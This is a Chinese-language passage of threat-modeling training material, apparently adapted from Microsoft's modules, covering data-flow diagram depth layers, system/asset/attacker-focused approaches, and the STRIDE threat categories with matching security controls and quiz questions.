过程层</h3><p>数据流关系图的过程层是第二层且应该用于大多数系统。 此层的数据流关系图包含单独的数据流关系图，这些关系图详细介绍每个系统部分。</p><p><u><strong>目标：</strong></u>表示次要的系统部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。</p><p>与系统层相似，过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统部分的所有过程。</p><div class="note warning"><p>大多数数据流关系图都需要过程级别深度层才能进行正确评估。</p></div><h4 id="何时使用过程层"><a href="#何时使用过程层" class="headerlink" title="何时使用过程层"></a>何时使用过程层</h4><p>对每个系统都使用过程层，<u>尤其是在处理敏感数据时</u>。 具有敏感数据的系统遭受攻击的风险更高。 <u>此级别的上下文可帮助你找出威胁以及更有效地降低或消除风险的方法</u>。</p><h4 id="深入了解系统部分-1"><a href="#深入了解系统部分-1" class="headerlink" title="深入了解系统部分"></a>深入了解系统部分</h4><p>在某些情况下，由于系统部分的敏感性和风险增加，可能需要更精细的上下文。 通过转到此层，可以更好地评估威胁和风险降低策略。 遵循系统层中的相同规则。</p><table><thead><tr><th align="left">步骤</th><th align="left">指南</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">使用清晰的描述标签创建一个过程元素，例如“Web 服务工作进程名称”。</td></tr><tr><td align="left">2</td><td align="left">创建一个新文件，并完全按照描述标签为其命名，命名采用类似路径的结构，例如“Web 服务名称 - Web 服务工作进程名称”。</td></tr><tr><td align="left">3</td><td align="left">仅将数据流关系图侧重于要“放大”的系统子部分。</td></tr></tbody></table><p>结果将获得子过程层（称为第 2 层）中的一系列数据流关系图。</p><div class="note green"><p>类似路径的文件命名结构有助于区分不同的级别</p></div><h4 id="知识检查-10"><a href="#知识检查-10" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>大多数应用程序属于哪一层？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 上下文层。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 过程层。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 子过程层。</p>            </div><p>参考答案：<psw>== B ==</psw></p><p>解释：<psw>A. 此层是任何系统的起点。 也称为系统层。B. 此层侧重于每个系统部分。C. 此层侧重于特定系统部分的系统子部分。</psw></p><h3 id="第-2-层-子过程层"><a href="#第-2-层-子过程层" class="headerlink" title="第 2 层 - 子过程层"></a>第 2 层 - 子过程层</h3><p>数据流关系图子过程是第三层。 <u>每当在创建高度敏感的系统时就应使用该层</u>。 此层的数据流关系图包含单独的数据流关系图，这些关系图分别详细介绍每个系统子部分。</p><p>目标：表示系统子部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。</p><p>与过程层相似，系统子过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统子部分的所有过程。</p><div class="note warning"><p>请与你的团队核对以确认是否需要此深度级别。</p></div><h4 id="何时使用子过程层"><a href="#何时使用子过程层" class="headerlink" title="何时使用子过程层"></a>何时使用子过程层</h4><p>将子过程层用于组织认为比较关键的系统。 系统子部分中的漏洞可能会使整个系统、客户和组织面临重大风险。</p><p>示例包括以下系统：</p><ul><li>在安全环境中使用的系统</li><li>处理敏感数据的系统</li><li>具有高风险评分的系统</li></ul><h4 id="深入了解系统子部分"><a href="#深入了解系统子部分" class="headerlink" title="深入了解系统子部分"></a>深入了解系统子部分</h4><p>任何需要更深入研究的系统子部分都应遵循过程层中的相同规则，并具有各自独立的数据流关系图。 通过较低级别的视图，用户可以“放大”和“缩小”系统，以展现尽可能多的上下文并达到更佳的清晰度。 方法如下：</p><table><thead><tr><th align="left">步骤</th><th align="left">指南</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">使用清晰的描述标签创建一个过程元素，例如“输入分析程序名称”。</td></tr><tr><td align="left">2</td><td align="left">创建一个新文件，并使用与描述标签完全相同的名称为其命名，命名采用树状结构，例如“Web 服务名称 - Web 服务工作进程名称 - 输入分析程序名称”。</td></tr><tr><td align="left">3</td><td align="left">仅将数据流关系图侧重于要“放大”的较低级别的系统子部分。</td></tr></tbody></table><p>结果将得到较低级别层（称为第 3 层）中的一系列数据流关系图。</p><div class="note green"><p>类似路径的文件命名结构有助于区分不同的级别。</p></div><h3 id="第-3-层-较低级别层"><a href="#第-3-层-较低级别层" class="headerlink" title="第 3 层 - 较低级别层"></a>第 3 层 - 较低级别层</h3><p>低级别层是最后一层，应在<u>创建内核级别系统或关键级别系统时使用</u>。 此层的数据流关系图包含单独的数据流关系图，这些关系图详细介绍每个低级别系统子部分。</p><p>目标：表示低级别系统子部分（具有足够的上下文），可帮助你了解其工作原理及彼此交互方式。</p><p>与过程层相似，系统子过程层中的数据流关系图应容纳在一个页面中，并包含其各自系统子部分的所有过程。</p><div class="note warning"><p>请与你的团队核对以确认是否需要此深度级别。</p></div><h4 id="何时使用低级别层"><a href="#何时使用低级别层" class="headerlink" title="何时使用低级别层"></a>何时使用低级别层</h4><p>高度关键级别系统和内核级别的系统应在此层进行威胁建模。 数据流关系图应详细描述每个子过程。 此外，通常只为一个子过程进行多轮安全检查。</p><p>按照前面各层中的步骤操作，将每个关系图追溯到各自的系统部分。</p><h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><h4 id="摘要-1"><a href="#摘要-1" class="headerlink" title="摘要"></a>摘要</h4><p>工程师利用威胁建模能够以图形方式向他人描述系统。 它创建了一个共同的基础，并实现了更加集中的安全对话。</p><p>但是，根据要构建的系统和所需的上下文，威胁模型可能变得太复杂或级别太高。</p><p>在本模块中，你了解了如何确定问题的优先级，以及如何根据类型和功能应用恰当的安全控制层。</p><p>本模块涵盖了以下内容：</p><ul><li>了解了数据流关系图深度层之间的差异</li><li>了解了何时使用每个层</li></ul><div class="note info"><p><strong>你知道吗？</strong> 除了这四个层之外，你还可以根据用户角色创建关系图，以帮助找出身份验证和授权方面的缺陷。 据 <a href="https://owasp.org/www-project-top-ten/">OWASP</a> 等信息源的报道，这些事故是目前各个组织面临的最大安全问题，因此，根据适用的角色应用威胁模型可以增强整个系统的安全性并帮助保护客户。</p></div><h4 id="知识检查-11"><a href="#知识检查-11" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪条陈述概括了在威胁建模阶段提早定义上下文深度层的重要性</li></ol><div class='checkbox'><input type="radio" />            <p>A. 这样我可以收集所有使用的外部组件的详细信息。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 这样做可以帮助我根据要求和期望生成恰当级别的上下文。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 这样做有助于在进行安全评审之前找出所有相关威胁。</p>            </div><p>参考答案：<psw>== B ==</psw></p><p>解释：<psw>A. 该陈述描述了设计阶段的一部分，但未定义上下文深度层的重要性。B. 此陈述阐明了在创建数据流关系图之前设置适当上下文级别的重要性。C. 此陈述描述了中断阶段的一部分，该阶段发生在创建数据流之后。</psw></p><h2 id="模块4-处理数据流关系图关注适当的威胁模型"><a href="#模块4-处理数据流关系图关注适当的威胁模型" class="headerlink" title="模块4 | 处理数据流关系图关注适当的威胁模型"></a>模块4 | 处理数据流关系图关注适当的威胁模型</h2><p>威胁建模是一种有效的技术，可帮助你确定威胁以及找到降低风险的方法。 你可以选择重点关注发现需要保护的方面或者攻击者在系统中的行为方式。</p><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><h4 id="重点关注重要方面"><a href="#重点关注重要方面" class="headerlink" title="重点关注重要方面"></a>重点关注重要方面</h4><p>关注适当的方面可以帮助你定制威胁建模练习，以得出优秀的效果。</p><p>示例包括：</p><ul><li>设计文件共享应用程序，并专注于保护其进程、数据存储和数据流。</li><li>设计文件共享应用程序，并专注于深入了解攻击者。<ul><li>包括攻击者的动机以及可能用于攻击应用程序的方式</li></ul></li></ul><p>在此模块中，<u>你将了解执行针对系统的威胁建模练习的含义</u>。 还会了解针对系统、资产和攻击者的方法之间的大概差异。</p><h4 id="学习目标-3"><a href="#学习目标-3" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将能够：</p><ul><li>定义针对系统的威胁建模练习</li><li>说明针对系统、资产和攻击者的方法之间的大概差异</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="威胁建模针对性方法"><a href="#威胁建模针对性方法" class="headerlink" title="威胁建模针对性方法"></a>威胁建模针对性方法</h3><p>威胁建模是一种很好的技术，可帮助你在开发生命周期的更早阶段发现问题。 选择侧重点恰当的方法有助于定制威胁建模练习。 你可以发现更多可对其执行操作的威胁和解决威胁的方法。</p><h4 id="侧重系统的方法"><a href="#侧重系统的方法" class="headerlink" title="侧重系统的方法"></a>侧重系统的方法</h4><p>目的是保护整个系统。 关注每个过程、数据存储、数据流、外部实体和信任边界。 利用此信息，可用选择安全控制措施来帮助保护系统。</p><p>此框架有助于分析系统及其对其他资产的影响，具体包括：</p><table><thead><tr><th align="left">资产类型</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">逻辑</td><td align="left">源代码、API 和逻辑安全控制措施</td></tr><tr><td align="left">物理</td><td align="left">服务器和物理安全控制资产</td></tr></tbody></table><h4 id="侧重攻击者的方法"><a href="#侧重攻击者的方法" class="headerlink" title="侧重攻击者的方法"></a>侧重攻击者的方法</h4><p>你可以着眼于攻击者、其动机、方法，以及他们能够在系统中造成破坏的所有方式。 这种方法关注入口点，而不是整个系统。</p><p>使用此方法，你可以专注于包含系统高度机密数据的关键资产。 重点是保护这些资产，而不是整个系统。</p><h4 id="侧重资产的方法"><a href="#侧重资产的方法" class="headerlink" title="侧重资产的方法"></a>侧重资产的方法</h4><p>评估每项资产的风险。 此方法基于分类数据处理等功能确定关键资产，主要专注于保护这些资产。</p><div class="note info"><p>Microsoft 工程师致力于保护系统。 渗透测试团队致力于保护系统和了解攻击者。</p></div><h3 id="针对系统的和其他方面的方法"><a href="#针对系统的和其他方面的方法" class="headerlink" title="针对系统的和其他方面的方法"></a>针对系统的和其他方面的方法</h3><h4 id="侧重系统的方法的重要性"><a href="#侧重系统的方法的重要性" class="headerlink" title="侧重系统的方法的重要性"></a>侧重系统的方法的重要性</h4><p>使用 Azure 对用户进行身份验证是很好的做法。 了解它的工作原理，了解它是如何与系统的每个部分进行交互，可以更好地避免产生实现部署后的未知风险。</p><p>毕竟，威胁建模的目标是验证之前做出的假设，确定潜在的威胁，并在开发生命周期中更早地降低风险。</p><p>侧重系统的方法的实践示例</p><p>让我们以文件共享应用程序为例。 在这种情况下，查看数据流关系图时，可能会看到以下流：</p><ul><li>用户请求访问应用程序</li><li>身份验证流启动</li><li>用户与其他用户共享文件</li></ul><p>此方法分析并保护每个元素， 例如用户、Web 服务、身份验证服务、数据存储、Internet 与 Azure 之间的信任边界以及数据流。</p><div class="note info"><p>针对系统的方法包含其他一些方法，但可能需要一一试用才能获得更精细的效果。</p></div><h4 id="知识检查-12"><a href="#知识检查-12" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>针对系统的方法有什么好处？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 使用此方法，你可以一次专注一个关键资产，以帮助确定所有潜在威胁以及降低或消除风险的方法。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 此方法可提供潜在攻击者的信息，其中包括其手段、动机和行动计划。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 此方法可让你专注于改进系统处理用户和数据的方法。 它还会验证关于通过服务使用的物理和逻辑资产的安全假设。</p>            </div><ol start="2"><li>针对攻击者的方法有什么好处？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 使用此方法，你可以一次专注一个关键资产，以识别所有潜在威胁以及降低风险的方法。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 此方法可提供潜在攻击者的信息，其中包括其手段、动机和行动计划。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 此方法可让你专注于改进系统处理用户和数据的方法。 它还会验证关于通过服务使用的物理和逻辑资产的安全假设。</p>            </div><p>参考答案：</p><ol><li><psw>== C ==</psw></li><li><psw>== B ==</psw></li></ol><p>解释：</p><ol><li><psw>A. 此条目对应于针对资产的方法。B. 此条目对应于针对攻击者的方法。C. 针对系统的方法考察整个系统，而不仅仅是其中的某些部分。</psw></li><li><psw>A. 此条目对应于针对资产的方法。B. 针对攻击者的方法基于攻击者及其攻击计划。C. 此条目描述针对系统的方法。</psw></li></ol><h3 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h3><p>威胁建模是一种有效的技术，可帮助你确定威胁以及降低或消除风险的方法。 你可以侧重于发现需要保护的方面或者攻击者在系统中的行为方式。</p><p>你了解了执行针对系统的威胁建模练习的含义。 还了解了针对系统、资产和攻击者的方法之间的差异。</p><p>在本模块中，你已经学习了以下内容：</p><ul><li>定义了针对系统的威胁建模练习</li><li>说明了针对系统、资产和攻击者的方法之间的大概差异</li></ul><h2 id="模块5-使用框架识别威胁并找到减少或消除风险的方法"><a href="#模块5-使用框架识别威胁并找到减少或消除风险的方法" class="headerlink" title="模块5 | 使用框架识别威胁并找到减少或消除风险的方法"></a>模块5 | 使用框架识别威胁并找到减少或消除风险的方法</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>威胁建模框架可帮助你生成潜在威胁的列表，并找到降低或消除风险的方法。</p><p>你只需具备信息安全方面的应用知识，框架就可为你列出威胁的主要类别，以确保它们得到适当的处理。</p><h4 id="何时使用框架"><a href="#何时使用框架" class="headerlink" title="何时使用框架"></a>何时使用框架</h4><p>此框架应适用于为新系统或现有系统创建的每个数据流关系图。</p><div class="note info"><p>目的是在开发生命周期的早期尽可能多地发现并修复问题。 等待时间越长，客户的风险就越高。</p></div><h4 id="预期结果"><a href="#预期结果" class="headerlink" title="预期结果"></a>预期结果</h4><p>框架将为你呈现六个主要威胁类别，每个类别下有无数个潜在威胁。</p><p>通过该框架，你将能够回答以下问题：</p><ul><li>通信的双方是否都通过了身份验证？</li><li>如何得知某人无法更改传输中的数据、正在使用的数据或静态数据？</li><li>每个操作是否可以绑定到标识？</li><li>如何得知某人无法看到传输中的数据、正在使用的数据或静态数据？</li><li>系统中是否存在资源受限的区域？</li><li>如何得知某人可以执行此操作？</li></ul><p>在本模块中，你将了解每种威胁类别及其相应的安全控制。</p><h4 id="学习目标-4"><a href="#学习目标-4" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将能够：</p><ul><li>讨论威胁建模框架中的每个威胁类别</li><li>了解有助于降低或消除风险的安全控制</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="威胁建模框架"><a href="#威胁建模框架" class="headerlink" title="威胁建模框架"></a>威胁建模框架</h3><p>威胁建模框架查看数据流关系图中的每个元素（包括它们的交互）。 这有助于发现潜在威胁和找到降低或消除风险的方式。</p><h4 id="威胁类别"><a href="#威胁类别" class="headerlink" title="威胁类别"></a>威胁类别</h4><p>Microsoft 工程师使用 STRIDE 框架中的六个主要威胁类别来发现安全设计问题：</p><table><thead><tr><th align="left">Category</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">欺骗</td><td align="left">冒充某人或某物</td></tr><tr><td align="left">篡改</td><td align="left">未经授权更改数据</td></tr><tr><td align="left">否认性</td><td align="left">不宣称对执行的操作负责</td></tr><tr><td align="left">信息泄露</td><td align="left">未经许可查看数据</td></tr><tr><td align="left">拒绝服务</td><td align="left">系统繁忙</td></tr><tr><td align="left">权限提升</td><td align="left">拥有本不应该拥有的权限</td></tr></tbody></table><h4 id="安全控制类别"><a href="#安全控制类别" class="headerlink" title="安全控制类别"></a>安全控制类别</h4><p>每个威胁类别都与安全控制关联，以帮助你降低或消除风险</p><table><thead><tr><th align="left">类别</th><th align="left">安全控制</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">欺骗</td><td align="left">身份验证</td><td align="left">其身份是否如其所述</td></tr><tr><td align="left">篡改</td><td align="left">完整性</td><td align="left">防止恶意修改数据</td></tr><tr><td align="left">否认性</td><td align="left">不可否认性</td><td align="left">操作与用户绑定</td></tr><tr><td align="left">信息泄露</td><td align="left">机密性</td><td align="left">保护数据免遭意外泄露</td></tr><tr><td align="left">拒绝服务</td><td align="left">可用性</td><td align="left">系统适当处理所有请求</td></tr><tr><td align="left">特权提升</td><td align="left">授权</td><td align="left">用户拥有执行请求的适当权限</td></tr></tbody></table><p>我们在接下来的几个单元中来了解一下各种威胁类别。</p><h3 id="欺骗-冒充某人或某物"><a href="#欺骗-冒充某人或某物" class="headerlink" title="欺骗 - 冒充某人或某物"></a>欺骗 - 冒充某人或某物</h3><p>当恶意人员或程序成功地冒充用户或系统进行恶意活动时，就会发生欺骗。</p><p>示例包括：</p><ul><li>攻击者通过看似合法的帐户向用户发送一封带有恶意链接和附件的电子邮件，以捕获用户的凭据、数据和设备访问权限</li><li>攻击者欺骗 SSID 和 IP 地址，同时使用开放且原本不安全的 TCP/IP 协议向受害者发送恶意的有效负载</li></ul><h4 id="可能面临欺骗攻击风险的元素和交互"><a href="#可能面临欺骗攻击风险的元素和交互" class="headerlink" title="可能面临欺骗攻击风险的元素和交互"></a>可能面临欺骗攻击风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr><tr><td align="left">外部实体</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">控制措施之外的过程、数据存储，甚至完全成熟的应用程序</td></tr></tbody></table><p>交互</p><table><thead><tr><th align="left">名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程 &lt;-&gt; 过程</td><td align="left"><img src="/img/thread-modeling/process-process.png" class="lazyload" data-srcset="/img/thread-modeling/process-process.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-process"></td><td align="left">一个任务从任务接收数据或向任务发送数据</td></tr><tr><td align="left">过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">一个任务向数据存储发送数据或从数据存储接收数据</td></tr><tr><td align="left">过程 &lt;-&gt; 外部实体</td><td align="left"><img src="/img/thread-modeling/process-externalentity.png" class="lazyload" data-srcset="/img/thread-modeling/process-externalentity.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-externalentity"></td><td align="left">一个任务向外部实体发送数据或从外部实体接收数据</td></tr></tbody></table><h4 id="如何防止欺骗攻击"><a href="#如何防止欺骗攻击" class="headerlink" title="如何防止欺骗攻击"></a>如何防止欺骗攻击</h4><p>身份验证验证了用户和系统的身份是否属实。</p><p>示例包括：</p><ul><li>发送和接收使用数字签名进行签名的消息，以验证来源并确保消息完整性</li><li>使用 SSL/TLS 保护数据传输，以加密信息源和目标之间的流量</li><li>使用具有时效有限的令牌、密码或多重身份验证的唯一凭据来帮助保护用户、管理员和服务帐户</li></ul><h4 id="用于降低或消除风险的常用安全控制"><a href="#用于降低或消除风险的常用安全控制" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><p>对于数据：</p><ul><li>哈希</li><li>消息验证码</li><li>数字签名</li></ul><p>对于系统：</p><ul><li>用户身份验证</li><li>Cookie 身份验证</li><li>Kerberos</li><li>SSL/TLS</li><li>证书</li><li>IPSec</li><li>数字签名的数据包</li></ul><div class="note green"><p>推荐问题：是否已验证通信双方的身份？</p></div><h4 id="知识检查-13"><a href="#知识检查-13" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对欺骗的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 发送方对消息进行数字签名，以便接收方了解消息的来源。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统为访问控制列表中列出的用户授予管理访问权限。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 此消息适用于欺骗。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。</psw></p><h3 id="篡改-未经授权更改数据"><a href="#篡改-未经授权更改数据" class="headerlink" title="篡改 - 未经授权更改数据"></a>篡改 - 未经授权更改数据</h3><p>当恶意攻击者未经授权在系统中读取、修改、删除或插入数据时，就会发生篡改。</p><p>示例包括：</p><ul><li>修改临时存储在缓存中、通过网络发送或永久存储在数据库中的数据以破坏数据完整性</li><li>将恶意有效负载插入浏览器缓存中，以导致进程和数据存储中的行为异常</li><li>通过弱 API 调用处理修改内存，导致崩溃和泄漏敏感错误消息</li><li>将数据重定向到被入侵的计算机以接管系统</li><li>诱使用户连接网络或下载文件，从而授予他们流量和设备访问权限（与欺骗结合使用）</li></ul><h4 id="可能面临篡改攻击风险的元素和交互"><a href="#可能面临篡改攻击风险的元素和交互" class="headerlink" title="可能面临篡改攻击风险的元素和交互"></a>可能面临篡改攻击风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久或临时的数据存储</td></tr><tr><td align="left">数据流</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">元素之间的数据移动</td></tr></tbody></table><p>交互</p><table><thead><tr><th>名称</th><th align="left">交互</th><th align="left">定义</th></tr></thead><tbody><tr><td>过程 &lt;-&gt; 数据存储</td><td align="left"><img src="/img/thread-modeling/process-datastore.png" class="lazyload" data-srcset="/img/thread-modeling/process-datastore.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process-datastore"></td><td align="left">一个任务向数据存储发送数据或从数据存储接收数据</td></tr><tr><td>数据流 &lt;-&gt; 信任边界</td><td align="left"><img src="/img/thread-modeling/flow-trustboundary-7599331.png" class="lazyload" data-srcset="/img/thread-modeling/flow-trustboundary-7599331.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flow-trustboundary"></td><td align="left">通过 Internet 将数据从受信任的环境传输给某人（反之亦然）</td></tr></tbody></table><h4 id="如何防止篡改"><a href="#如何防止篡改" class="headerlink" title="如何防止篡改"></a>如何防止篡改</h4><p>完整性防止恶意修改数据。 示例包括：</p><ul><li>验证输入以防止处理恶意有效负载和错误处理意外行为</li><li>使用数字签名对消息进行签名，以确保消息不被篡改</li><li>使用访问控制列表应用权限</li><li>使用 SSL/TLS 保护传输</li><li>创建 IPSec 隧道，以保护终结点之间的通信</li></ul><h4 id="用于降低或消除风险的常用安全控制-1"><a href="#用于降低或消除风险的常用安全控制-1" class="headerlink" title="用于降低或消除风险的常用安全控制"></a>用于降低或消除风险的常用安全控制</h4><ul><li>操作系统完整性控制</li><li>访问控制列表 (ACL)</li><li>数字签名</li><li>消息验证码</li></ul><div class="note green"><p>推荐问题：如何得知某人无法更改传输中的数据或静态数据？</p></div><h4 id="知识检查-14"><a href="#知识检查-14" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>哪一条陈述描述了针对篡改的安全控制？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 发件人对电子邮件附件进行加密，以便让收件人知道电子邮件由何人所发。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 系统记录所有操作和用户，明确每个人的责任。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 系统为访问控制列表中列出的用户授予管理访问权限。</p>            </div><p>参考答案：<psw>== C ==</psw></p><p>解释：<psw>A. 加密附件是不够的。 对消息进行数字签名，以确保不会发生篡改。B. 这条陈述适用于否认性。C. 这条陈述适用于篡改、信息泄露、拒绝服务和权限提升。</psw></p><h3 id="否认性-不宣称对执行的操作负责"><a href="#否认性-不宣称对执行的操作负责" class="headerlink" title="否认性 - 不宣称对执行的操作负责"></a>否认性 - 不宣称对执行的操作负责</h3><p>当有人出于恶意或无意采取某个操作，但声明其他操作时，就会发生否认性。</p><p>示例包括：</p><ul><li>拒绝修改包含敏感操作的日志</li><li>使用其他人的帐户以避免被抓</li><li>声称没有删除数据库记录</li></ul><div class="note info"><p>系统日志是攻击者的金矿，不仅可用于操纵，而且可用于收集有关用户、环境和弱点的数据。</p></div><h4 id="可能面临否认性攻击风险的元素和交互"><a href="#可能面临否认性攻击风险的元素和交互" class="headerlink" title="可能面临否认性攻击风险的元素和交互"></a>可能面临否认性攻击风险的元素和交互</h4><p>元素</p><table><thead><tr><th align="left">名称</th><th align="left">形状</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">修改输入或将输入重定向到输出的活动</td></tr><tr><td align="left">外部实体</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" 